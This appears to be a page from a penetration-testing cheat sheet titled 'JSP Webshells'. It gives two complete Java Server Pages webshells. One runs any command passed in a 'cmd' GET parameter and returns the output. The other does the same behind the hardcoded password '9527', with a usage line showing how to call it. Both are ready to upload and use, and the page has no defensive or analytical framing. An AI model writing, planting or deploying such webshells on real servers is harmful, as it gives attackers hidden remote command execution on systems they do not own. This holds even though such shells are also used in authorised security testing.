---
description: JSP Webshells
---

# JSP

### Basic (GET) JSP Webshell

```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// cmd.jsp?cmd=whoami
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

### Basic (GET) JSP Webshell protected by a password

**Usage:** _webshell.jsp?pwd=9527\&i=whoami_

{% code overflow="wrap" %}
```java
<% if("9527".equals(request.getParameter("pwd"))){
                    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
                    int a = -1;
                    byte[] b = new byte[2048];
                    out.print("<pre>");
                    while((a=in.read(b))!=-1){
                        out.println(new String(b));
                    }
                    out.print("</pre>");
                }
            %>
```
{% endcode %}